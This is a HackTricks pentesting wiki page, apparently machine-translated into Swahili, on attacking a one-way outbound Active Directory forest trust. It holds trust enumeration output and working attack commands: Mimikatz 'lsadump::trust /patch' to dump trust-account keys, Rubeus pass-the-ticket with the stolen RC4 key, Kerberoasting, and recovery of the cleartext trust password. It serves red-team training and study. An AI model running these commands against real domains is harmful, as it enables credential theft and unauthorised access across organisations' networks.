# External Forest Domain - One-Way (Outbound)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Katika hali hii **domeni yako** in **amini** baadhi ya **mamlaka** kwa kiongozi kutoka **domeni tofauti**.

## Enumeration

### Outbound Trust
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Trust Account Attack

Ukiukosefu wa usalama upo wakati uhusiano wa kuaminiana unapoanzishwa kati ya maeneo mawili, ambayo yanatambulika hapa kama eneo **A** na eneo **B**, ambapo eneo **B** linapanua uaminifu wake kwa eneo **A**. Katika mpangilio huu, akaunti maalum inaundwa katika eneo **A** kwa ajili ya eneo **B**, ambayo ina jukumu muhimu katika mchakato wa uthibitishaji kati ya maeneo mawili. Akaunti hii, inayohusishwa na eneo **B**, inatumika kwa ajili ya kuficha tiketi za kupata huduma kati ya maeneo.

Jambo muhimu kuelewa hapa ni kwamba nenosiri na hash ya akaunti hii maalum yanaweza kutolewa kutoka kwa Kidhibiti cha Eneo katika eneo **A** kwa kutumia zana ya amri. Amri ya kutekeleza kitendo hiki ni:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Hii uchimbaji inawezekana kwa sababu akaunti, iliyotambulishwa na **$** baada ya jina lake, iko hai na inahusishwa na kundi la "Domain Users" la kikoa **A**, hivyo ikirithi ruhusa zinazohusiana na kundi hili. Hii inawawezesha watu kuthibitisha dhidi ya kikoa **A** wakitumia akidi za akaunti hii.

**Warning:** Inawezekana kutumia hali hii kupata msingi katika kikoa **A** kama mtumiaji, ingawa kwa ruhusa zilizopunguzwa. Hata hivyo, ufikiaji huu unatosha kufanya uhesabuji katika kikoa **A**.

Katika hali ambapo `ext.local` ni kikoa kinachotegemea na `root.local` ni kikoa kinachotegemewa, akaunti ya mtumiaji iliyoitwa `EXT$` ingekuwa ikiumbwa ndani ya `root.local`. Kupitia zana maalum, inawezekana kutoa funguo za kuaminiana za Kerberos, zikifunua akidi za `EXT$` katika `root.local`. Amri ya kufanikisha hili ni:
```bash
lsadump::trust /patch
```
Kufuata hili, mtu anaweza kutumia funguo ya RC4 iliyochukuliwa kuthibitisha kama `root.local\EXT$` ndani ya `root.local` kwa kutumia amri ya chombo kingine:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Huu hatua ya uthibitishaji inafungua uwezekano wa kuhesabu na hata kutumia huduma ndani ya `root.local`, kama vile kufanya shambulio la Kerberoast ili kutoa akauti za huduma kwa kutumia:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Kukusanya nenosiri la kuaminiana la wazi

Katika mchakato uliopita, ilitumika hash ya kuaminiana badala ya **nenosiri la wazi** (ambalo pia **lilikuwa limeondolewa na mimikatz**).

Nenosiri la wazi linaweza kupatikana kwa kubadilisha \[ CLEAR ] kutoka kwa mimikatz kutoka hexadecimal na kuondoa bytes za null ‘\x00’:

![](<../../.gitbook/assets/image (938).png>)

Wakati mwingine unapounda uhusiano wa kuaminiana, nenosiri linapaswa kuandikwa na mtumiaji kwa ajili ya kuaminiana. Katika onyesho hili, ufunguo ni nenosiri la kuaminiana la awali na hivyo linaweza kusomeka na binadamu. Kadri ufunguo unavyopitia (siku 30), nenosiri la wazi halitasomeka na binadamu lakini kiufundi bado linaweza kutumika.

Nenosiri la wazi linaweza kutumika kufanya uthibitishaji wa kawaida kama akaunti ya kuaminiana, mbadala wa kuomba TGT kwa kutumia ufunguo wa siri wa Kerberos wa akaunti ya kuaminiana. Hapa, kuuliza root.local kutoka ext.local kwa wanachama wa Domain Admins:

![](<../../.gitbook/assets/image (792).png>)

## Marejeleo

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
